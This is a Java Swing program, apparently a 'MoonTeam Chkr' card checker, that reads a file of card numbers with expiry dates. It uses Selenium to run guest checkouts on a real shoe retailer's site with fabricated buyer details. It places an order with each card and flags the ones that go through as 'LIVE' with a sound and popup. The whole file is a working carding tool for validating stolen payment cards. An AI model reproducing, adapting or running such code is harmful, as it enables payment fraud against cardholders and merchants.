/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package app;

import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.table.DefaultTableModel;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebDriverException;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.Select;
import org.openqa.selenium.support.ui.WebDriverWait;

/**
 *
 *
 */


public class formFichero extends javax.swing.JFrame {

    String patch = "";
    String numeroBean = "";
    String numeroMes = "";
    String numeroAnio = "";
    int i = 0;
    int contTarjeta = 0;
    int totalContTarjetas = 0;
    

    /**
     * Creates new form formFichero
     */
    public formFichero() {
        initComponents();
        EVENTOS.setText("Esperando al usuario");
        this.setLocationRelativeTo(null);
        mostrarTabla("");
    }

    private void mostrarTabla(String numero) {

        //ArrayList<Persona> ad = p.consultarPersona();
        DefaultTableModel miJTable = (DefaultTableModel) jTableTarjeta.getModel();

        miJTable.setNumRows(i);
        i++;
        String dato[] = new String[1];

        dato[0] = String.valueOf(numero);
        miJTable.addRow(dato);

    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jTableTarjeta = new javax.swing.JTable();
        btnRun1 = new javax.swing.JButton();
        btnSeleccionar = new javax.swing.JButton();
        avance = new javax.swing.JTextArea();
        btnRun = new javax.swing.JButton();
        EVENTOS = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        CONTADOR = new javax.swing.JLabel();
        jLabel = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(102, 102, 102));
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setUndecorated(true);
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jTableTarjeta.setOpaque(false);
        jTableTarjeta.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        jTableTarjeta.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {
                {null},
                {null},
                {null},
                {null},
                {null},
                {null},
                {null},
                {null},
                {null},
                {null}
            },
            new String [] {
                "Tarjeta"
            }
        ));
        jTableTarjeta.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        jTableTarjeta.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTableTarjetaMouseClicked(evt);
            }
        });
        jTableTarjeta.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTableTarjetaKeyPressed(evt);
            }
        });
        jScrollPane1.setViewportView(jTableTarjeta);
        if (jTableTarjeta.getColumnModel().getColumnCount() > 0) {
            jTableTarjeta.getColumnModel().getColumn(0).setHeaderValue("Tarjeta");
        }

        getContentPane().add(jScrollPane1, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 120, 575, 170));

        btnRun1.setBackground(new java.awt.Color(167, 41, 215));
        btnRun1.setFont(new java.awt.Font("Rockwell", 1, 14)); // NOI18N
        btnRun1.setText("Terminar");
        btnRun1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnRun1ActionPerformed(evt);
            }
        });
        getContentPane().add(btnRun1, new org.netbeans.lib.awtextra.AbsoluteConstraints(120, 20, 100, -1));

        btnSeleccionar.setOpaque(true);
        btnSeleccionar.setBackground(new java.awt.Color(255, 0, 0));
        btnSeleccionar.setFont(new java.awt.Font("Rockwell", 1, 14)); // NOI18N
        btnSeleccionar.setText("Seleccionar CCs");
        btnSeleccionar.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSeleccionarActionPerformed(evt);
            }
        });
        getContentPane().add(btnSeleccionar, new org.netbeans.lib.awtextra.AbsoluteConstraints(20, 60, -1, -1));

        avance.setBackground(new java.awt.Color(20, 96, 135));
        avance.setColumns(20);
        avance.setFont(new java.awt.Font("Monospaced", 3, 18)); // NOI18N
        avance.setForeground(new java.awt.Color(255, 255, 255));
        avance.setRows(5);
        avance.setText("Bienvenido a MoonTeam Chkr");
        getContentPane().add(avance, new org.netbeans.lib.awtextra.AbsoluteConstraints(250, 10, 300, 30));

        btnRun.setBackground(new java.awt.Color(89, 29, 251));
        btnRun.setFont(new java.awt.Font("Rockwell", 1, 14)); // NOI18N
        btnRun.setText("Livea!");
        btnRun.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnRunActionPerformed(evt);
            }
        });
        getContentPane().add(btnRun, new org.netbeans.lib.awtextra.AbsoluteConstraints(20, 20, 93, -1));

        EVENTOS.setFont(new java.awt.Font("Yu Gothic UI Semilight", 1, 14)); // NOI18N
        EVENTOS.setForeground(new java.awt.Color(255, 255, 255));
        getContentPane().add(EVENTOS, new org.netbeans.lib.awtextra.AbsoluteConstraints(40, 320, 310, 30));

        jLabel1.setFont(new java.awt.Font("Yu Gothic UI", 1, 14)); // NOI18N
        jLabel1.setForeground(javax.swing.UIManager.getDefaults().getColor("textHighlightText"));
        jLabel1.setText("Cantidad de tarjetas:");
        getContentPane().add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(380, 330, 130, 30));

        CONTADOR.setFont(new java.awt.Font("Yu Gothic UI Semilight", 1, 14)); // NOI18N
        CONTADOR.setForeground(new java.awt.Color(255, 255, 255));
        getContentPane().add(CONTADOR, new org.netbeans.lib.awtextra.AbsoluteConstraints(520, 330, 60, 30));

        jLabel.setForeground(new java.awt.Color(51, 51, 255));
        jLabel.setIcon(new javax.swing.ImageIcon("C:\\Users\\USUARIO\\Pictures\\6190250-futuristic-wallpaper.png")); // NOI18N
        getContentPane().add(jLabel, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 595, 380));

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void btnSeleccionarActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSeleccionarActionPerformed
        try {
            JFileChooser buscaArchivo = new JFileChooser();
            buscaArchivo.showOpenDialog(buscaArchivo);
            patch = buscaArchivo.getSelectedFile().getAbsolutePath();
            jLabel.setText(patch);
            EVENTOS.setText("Tarjetas Cargadas con éxito...");
        } catch (java.lang.NullPointerException e) {
            JOptionPane.showMessageDialog(null, "Error " + e.getMessage());
        }
    }//GEN-LAST:event_btnSeleccionarActionPerformed

    private void btnRunActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRunActionPerformed
        EVENTOS.setText("Procesando...");
        
        System.setProperty("webdriver.chrome.driver", "chromedriver.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("start-maximized");
        options.addArguments("disable-infobars");

        WebDriver driver;
        try {
            driver = new ChromeDriver(options);
            

            try {
                /*
                    Llamamos al metodo que recorre los componentes principales
                 */
                runAuto(driver);

                String cadena;
                FileReader file = new FileReader(patch);
                BufferedReader b = new BufferedReader(file);

                boolean valor = true;
                
                do {

                    while ((cadena = b.readLine()) != null) {
                        System.out.println(cadena);

                        for (int i = 0; i < cadena.length(); i++) {
                            numeroBean = cadena.substring(0, 16);
                            numeroMes = cadena.substring(17, 19);
                            numeroAnio = cadena.substring(20, 24);

                        }
                        totalContTarjetas++;
                        //jLabelNumeroTarjetas.setText("Total tarjetas evaluadas: " + totalContTarjetas);

                        //Thread.sleep(3000);
                        WebElement number = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("number"))));
                        //WebElement number = driver.findElement(By.name("number"));
                        //EVENTOS.setText("Probado tarjeta" + numeroBean "|" + numeroMes "|" + numeroAnio "   InfChk");
                        number.sendKeys(numeroBean); 
                        WebElement mes = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("expMonth"))));
                        //WebElement mes = driver.findElement(By.name("expMonth"));
                        Select selectMes = new Select(mes);
                        selectMes.selectByValue(numeroMes);
                        WebElement anio = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("expYear"))));
                        //WebElement anio = driver.findElement(By.name("expYear"));
                        Select selectAnio = new Select(anio);
                        selectAnio.selectByValue(numeroAnio);
                        //Thread.sleep(1000);
                        number.sendKeys(Keys.ENTER);
                        Thread.sleep(2000);
                        WebElement buttonCompra = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary chk-proceed-btn right'][text()='Place Order'][text()='Place Order']/self::BUTTON"));
                        //WebElement buttonCompra = (new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary chk-proceed-btn right'][text()='Place Order'][text()='Place Order']/self::BUTTON"))));
                        buttonCompra.click();
                        //Thread.sleep(3000);
                        /*
                            Validamos que el elemento este visible y se haya cargado
                        */

                        //WebElement modal = (new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.id("modal-generic-error"))));
                        driver.findElement(By.id("modal-generic-error")).isDisplayed(); 
                        
                        WebElement modal = (new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.id("modal-generic-error"))));                                   
                        //WebElement modal = driver.findElement(By.id("modal-generic-error"));                        
                        System.out.println("Elemento modal error: " + modal.toString());                        
                        valor = modal.isDisplayed();
                        //WebElement comprapasa = driver.findElement(By.className("sb-orange"));
                        System.out.println("Valor modal: " + valor);
                        /*
                            Si el modal esta, cerrar y ejecutar los siguientes pasos para volver al bucle de las tarjetas
                         */
                        
                        if (valor) {
                            //Thread.sleep(3000);
                            
                            WebElement modalClose = (new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.className("close"))));
                            //WebElement modalClose = driver.findElement(By.className("close"));
                            modalClose.click();
                            //Thread.sleep(500);                            
                            WebElement editeTarjet = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//A[@href='#'][text()='EDIT']/self::A"))));
                            editeTarjet.click();

                            //Thread.sleep(1000);
                            /*
                            //WebElement addediteTarjet = driver.findElement(By.className("chk-plus-label")); */
                            WebElement addediteTarjet = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.className("chk-pay-opt--new"))));
                            //WebElement addediteTarjet = driver.findElement(By.className("chk-pay-opt--new"));                            
                            addediteTarjet.click();

                            Thread.sleep(1000);
                            WebElement checkoutForm = (new WebDriverWait(driver, 15).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//INPUT[@class='chk-pay-match-addr']/self::INPUT"))));
                            //WebElement checkoutForm = driver.findElement(By.xpath("//INPUT[@class='chk-pay-match-addr']/self::INPUT"));
                            //Thread.sleep(500);
                            checkoutForm.click();
                            Thread.sleep(1000);
                            contTarjeta++;
                            
                            
                           
                            /*
                                Refrezcar la pagina después de 9 tarjetas
                             */
                            if (contTarjeta > 9) {
                                driver.navigate().refresh();
                                System.out.println("----------Refrezcando navegador----------");
                                Thread.sleep(2000);
                                contTarjeta = 0;
                            }
                            
                        } else {
                            //Thread.sleep(2000);   
                            
                            driver.findElement(By.className("brdialog-win")).isDisplayed();                    
                            //Thread.sleep(2000);                            
                            driver.findElement(By.xpath(("//SPAN[text()='Your order has been placed.'])[1]/../../..//DIV[@id='brmerchantLogo']")));
                            driver.findElement(By.className("brdialog-head"));
                            //WebElement comprapasa = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.className("sb-orange"))));
                            Clip sonido = AudioSystem.getClip();
                            File a = new File("sonido.wav");
                            sonido.open(AudioSystem.getAudioInputStream(a));
                            sonido.start();
                            //Thread.sleep(1000);
                            sonido.start();
                            JTextArea ta = new JTextArea(5, 5);
                            ta.setText(numeroBean);
                            JOptionPane.showMessageDialog(null, ta, "LIVE", JOptionPane.INFORMATION_MESSAGE);
                            mostrarTabla("😎 " + numeroBean + "|" + numeroMes + "|" + numeroAnio + " LIVE 😎");
                            System.out.println("  MoonTeam LIVE " + numeroBean +  numeroMes + numeroAnio + "live");
                            //mostrarTabla("😎 Rise2UPChckr" + numeroBean + numeroMes + numeroAnio + " LIVE 😎");
                            driver.manage().deleteAllCookies();
                            Thread.sleep(4000);
                            /*
                                Llamamos al metodo que recorre los componentes principales
                            */
                            runAuto(driver);

                        }
                    }
                    if (b.readLine() == null) {
                        JOptionPane.showMessageDialog(null, "Termino el archivo, por favor seleccione otro");
                        break;

                    }
                } while (valor);

            } catch (WebDriverException e) {
                JOptionPane.showMessageDialog(null, "Excepcion dentro de los parametros tarjeta");
                JOptionPane.showMessageDialog(null, e.getMessage());

            }
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "Excepcion dentro del driver" + e.getMessage());
            JOptionPane.showMessageDialog(null, e.getStackTrace());

        }
    }

    /*
        Metodo que ejecuta todos los componentes principales de la pagina
     */
        
    private static void runAuto(WebDriver driver) {
        try { //non-static variable cannot be referenced from static context
            
            
            driver.get("https://www.shoes.com/dearfoams-pile-bootie-slipper-with-fairisle-trim/788211/1686837");
            
           
            //driver.get("https://www.shoes.com");
            
            /*
                    Botón agregar compra
             */
            
            Thread.sleep(1000);
            WebElement buttonTalla = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.id("size_2_1"))));
            //WebElement buttonTalla = driver.findElement (By.id("size_2_1"));
            buttonTalla.click();
            WebElement button = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.id("add-cart"))));
            //WebElement button = driver.findElement(By.id("add-cart"));
            button.click();
                 
           
            /*
                    Botón checkout
             */
            //Thread.sleep(3000);
            //WebElement buttonCheckout = driver.findElement(By.className("crt-proceed-btn"));
            WebElement buttonCheckout = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary crt-proceed-btn'][text()='Checkout'][text()='Checkout']/self::BUTTON"))));
            //WebElement buttonCheckout = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary crt-proceed-btn'][text()='Checkout'][text()='Checkout']/self::BUTTON"));
            buttonCheckout.click();
            
            /*
                    Formulario de email
             */
            WebElement email = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("guestEmail"))));
            //WebElement email = driver.findElement(By.name("guestEmail"));
            Random aleatorio = new Random();
            int intAletorio = aleatorio.nextInt(100000);
            email.sendKeys("kevinmit"  + intAletorio + "@outlook.es");
            //Thread.sleep(3000);
            email.sendKeys(Keys.ENTER);
            /*
                    Formulario de registro de datos
             */
            //Thread.sleep(1000); 
            WebElement firsName = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("firstName"))));
            //WebElement firsName = driver.findElement(By.name("firstName"));
            firsName.sendKeys("Jhonny");
            
            //WebElement lastName = driver.findElement(By.name("lastName"));
            WebElement lastName = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("lastName"))));
            lastName.sendKeys("Swanson");
            //String[] direcciones = {"ninguna", "ninguna", "ninguna", "ninguna", "ninguna"};
            //int direccion = aleatorio.nextInt(10);
            WebElement address1 = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("address1"))));
            //WebElement address1 = driver.findElement(By.name("address1"));
            address1.sendKeys("none");
            //address1.sendKeys(direcciones[direccion]);
            WebElement address2 = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("address2"))));
            //WebElement address2 = driver.findElement(By.name("address2"));
            address2.sendKeys("none");
            //address2.sendKeys(direcciones[direccion]);
            WebElement city = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("city"))));
            //WebElement city = driver.findElement(By.name("city"));
            city.sendKeys("New York");
            WebElement stateProvince = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("stateProvince"))));
            //WebElement stateProvince = driver.findElement(By.name("stateProvince"));
            Select selectState = new Select(stateProvince);
            selectState.selectByValue("NY");
            WebElement postalCode = (new WebDriverWait(driver, 10).until(ExpectedConditions.visibilityOfElementLocated(By.name("postalCode"))));  
            //WebElement postalCode = driver.findElement(By.name("postalCode"));
            postalCode.sendKeys("10001");

            WebElement phoneNumber = driver.findElement(By.name("phoneNumber"));
            
            phoneNumber.sendKeys("174953"+ intAletorio +"380");

            phoneNumber.sendKeys(Keys.ENTER);
            Thread.sleep(2000);
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "Excepcion dentro de los parametros formulario " + e.getMessage());
            JOptionPane.showMessageDialog(null, e.getLocalizedMessage());
        }


    }//GEN-LAST:event_btnRunActionPerformed

    private void jTableTarjetaMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTableTarjetaMouseClicked
        // TODO add your handling code here:
        //System.out.println(id_persona);
    }//GEN-LAST:event_jTableTarjetaMouseClicked

    private void jTableTarjetaKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTableTarjetaKeyPressed
        // TODO add your handling code here:
    }//GEN-LAST:event_jTableTarjetaKeyPressed

    private void btnRun1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRun1ActionPerformed
    System.exit(0);    
// TODO add your handling code here:

        //Runtime.getRuntime().exit(0);  //esto cierra la aplicacion
    }//GEN-LAST:event_btnRun1ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        try {
            /* Set the Nimbus look and feel */
            //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
            /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
            * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
             */

            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Windows".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;

                }
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(formFichero.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            Logger.getLogger(formFichero.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            Logger.getLogger(formFichero.class.getName()).log(Level.SEVERE, null, ex);
        } catch (UnsupportedLookAndFeelException ex) {
            Logger.getLogger(formFichero.class.getName()).log(Level.SEVERE, null, ex);
        }
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new formFichero().setVisible(true);

            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel CONTADOR;
    private javax.swing.JLabel EVENTOS;
    private javax.swing.JTextArea avance;
    private javax.swing.JButton btnRun;
    private javax.swing.JButton btnRun1;
    private javax.swing.JButton btnSeleccionar;
    private javax.swing.JLabel jLabel;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTable jTableTarjeta;
    // End of variables declaration//GEN-END:variables
}

/**
 *
 * @author Michael García A
 */
